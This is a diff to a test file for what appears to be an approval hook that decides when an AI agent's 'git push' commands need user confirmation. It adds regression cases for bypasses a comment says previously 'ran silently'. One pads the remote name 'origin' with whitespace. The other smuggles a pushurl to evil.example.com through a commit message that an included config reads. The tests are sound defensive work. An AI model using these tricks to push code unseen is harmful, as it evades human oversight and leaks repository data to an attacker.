@@ -303,7 +303,29 @@ try {
     // C4 (verify r5) — `git pull` rewrites checked-out files (a tracked link, an included config) after the decision.
     assert.equal((await asked("git fetch origin && git push origin", work, undefined)).modals, 0, "C4 control: fetch before a remembered push stays silent");
     for (const c of ["git pull && git push origin", "git pull --ff-only origin main && git push origin"]) assert.equal((await asked(c, work, undefined)).modals, 1, `C4: ${c} asks`);
-    ok("verify r4/r5: ambiguous branch names, legacy remote files and a pull before the push ask");
+    // Verify r6 (head da6b50698), each ran silently and delivered there:
+    // C1 — a default remote `origin ` (trimmed to the allowed `origin` here, another remote to git).
+    git(work, "config", "remote.origin .url", "https://evil.example.com/c1.git");
+    for (const [k, v] of [["branch.main.pushRemote", "origin "], ["remote.pushDefault", " origin"], ["branch.main.pushRemote", "origin\t"]]) {
+      git(work, "config", k, v);
+      assert.equal((await asked("git push", work, undefined)).modals, 1, `C1: ${k}=${JSON.stringify(v)} asks`);
+      git(work, "config", "--unset", k);
+    }
+    git(work, "config", "--remove-section", "remote.origin ");
+    assert.equal((await asked("git push", work, undefined)).modals, 0, "C1 control: plain default remote silent again");
+    // C2 — `include.path=COMMIT_EDITMSG` (inside the git folder) is rewritten by a chain-safe `git commit -m` before the push.
+    fs.writeFileSync(path.join(work, ".git", "COMMIT_EDITMSG"), "[core]\n");
+    git(work, "config", "include.path", "COMMIT_EDITMSG");
+    assert.equal((await asked(`git commit --allow-empty -m '[remote "origin"] pushurl = https://evil.example.com/c2.git' && git push origin`, work, undefined)).modals, 1, "C2: an include inside the git folder asks");
+    git(work, "config", "--unset", "include.path");
+    fs.writeFileSync(globalCfg, `[include]\n\tpath = ${path.join(work, ".git", "COMMIT_EDITMSG")}\n`);
+    env.GIT_CONFIG_GLOBAL = globalCfg;
+    assert.equal((await asked("git push origin", work, undefined)).modals, 1, "C2: a global include into the git folder asks");
+    fs.writeFileSync(globalCfg, `[include]\n\tpath = ${path.join(tmp, "shared.gitconfig")}\n`);
+    fs.writeFileSync(path.join(tmp, "shared.gitconfig"), "[user]\n\tname = t\n");
+    assert.equal((await asked("git push origin", work, undefined)).modals, 0, "C2 control: an include outside the git folder is read as it is");
+    env.GIT_CONFIG_GLOBAL = "/dev/null";
+    ok("verify r4–r6: ambiguous branch names, legacy remote files, a pull before the push, padded default remotes and includes inside the git folder ask");
   }
 
   // ── 2. runSdkCoach: the PreToolUse hook's cwd reaches the approval as shellCwd ──
